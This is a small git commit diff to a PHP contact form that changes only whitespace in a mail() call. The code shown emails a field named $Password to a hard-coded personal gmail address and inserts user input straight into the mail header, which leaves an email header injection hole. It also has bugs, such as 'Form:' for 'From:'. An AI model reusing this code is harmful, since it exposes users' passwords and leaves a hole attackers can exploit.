253604224a497032e1c3de77d7ce4199fd6e22a9
949919 <99135921+949919@users.noreply.github.com>
2022-02-08 12:31:15 +0530

    Update contact.php

--- contact.php
+++ contact.php
@@ -10,7 +10,7 @@ if (empty($MobileNo) || empty($Password))
 else
 {
 	//Send an email and print sender confirmation...
-	mail("yk861595@gmail.com", "Webtech massage", "$massage", "Form: $MobileNo <$Password>");//Eidt the email adress you wish and massage to be sent to 
+	mail("yk861595@gmail.com", " Webtech massage", "$massage", "Form: $MobileNo <$Password>");// Eidt the email adress you wish and massage to be sent to 
 
 	echo "<script type='text/javascript'>alert('Your massage is sent sucessfully');
 	window.history.log(-1);
